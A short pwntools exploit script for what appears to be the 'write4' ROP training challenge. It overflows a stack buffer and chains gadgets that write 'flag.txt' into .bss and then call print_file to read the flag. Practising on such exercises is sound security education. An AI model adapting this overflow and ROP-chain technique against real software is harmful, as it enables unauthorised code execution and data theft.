#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('write4')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
      return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
      return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *pwnme+152
continue
'''.format(**locals())

# -- Exploit goes here --
# 0x400628: mov qword ptr [r14], r15; ret;
# 0x400690: pop r14; pop r15; ret;
# 0x400693: pop rdi; ret;
# 0x4004e6: ret;
# 0x601038: .bss
 
ret         = 0x4004e6
bss         = 0x601038
pop_rdi     = 0x400693
pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628
print_file  = 0x400510

pay = b'A' * 44
pay += p64(ret)
pay += p64(pop_r14_r15)
pay += p64(bss)
pay += b'flag.txt'
pay += p64(mov_r14_r15)
pay += p64(pop_rdi)
pay += p64(bss)
pay += p64(print_file)

io = start()

io.clean()
io.sendline(pay)
io.interactive()
